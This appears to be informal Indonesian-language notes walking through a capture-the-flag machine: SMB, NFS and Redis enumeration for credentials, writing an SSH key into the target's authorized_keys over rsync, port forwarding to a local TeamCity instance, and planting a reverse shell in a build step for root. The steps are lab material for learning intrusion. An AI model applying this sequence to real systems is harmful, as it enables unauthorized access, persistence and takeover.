# boot:
1. scan nmap ada ssh smb nfs -> cek client2 smb -> smbclient -L //ip -> ada masuk aja -> smbclient //ip/nama_yg_ga$
2. get semua file ada flag -> get file
3. cek nfs -> showmount -e ip -> sudo mount -t nfs 'ip:pathnya' namadir_temp_mu -o nolock
4. cek cek cek redis dia kan db -> search aja di vim /requirepass
5. dah login aja disitu -> redis-cli -h ip -> AUTH passwdtadi -> info keys -> keys * -> get "key_mu"
6. dapet flag di internal
7. cek juga di keys authlist -> get "keynya" -> type "keynya" -> lrange "keynya" 0 10 -> decode aja base64
8. ada tuh tinggal pake aja -> rsync -av -P --list-only rsync://rsync-connect@10.10.55.82/files
9. itu buat liat doang pake ini sekarang 
10. rsync -av rsync://rsync-connect@10.10.55.82/files output_rsync  -> cd kesana klaim user flag
11. ssh-keygen -t rsa -> nanti catet tuh path pub sama rsa nya 
12. upload rsa pub ke authorized_keys target 
13. rsync -av /home/tomba/.ssh/id_rsa.pub  rsync://rsync-connect@10.10.55.82/files/sys-internal/.ssh/authorized_keys
14. dah tinggal ssh aja ssh -i letak_rsa sys-internal@ip 


# PE :
1. baca wu ->  ss -tulnp | grep 127.0.0.1 -> ada port kebuka disini
2. ssh -L 8111:127.0.0.1:8111 sys-internal@ip -i rsa_mu
3. buka 8111 di browser -> salahin aja -> dia kasih tau manual di login.html masuk aja
4. pilih yang login as super user -> nanti ke / ada Teamcity -> cat * | grep authentication
5. coba masuk pake itu -> dah masuk create project baru -> next buat buat buat aja
6. sampe ada build config keknya -> build steps -> masukin command line -> isi revshell
7. simpen dulu klik lagi terus run nyalain nc -> dah klaim root
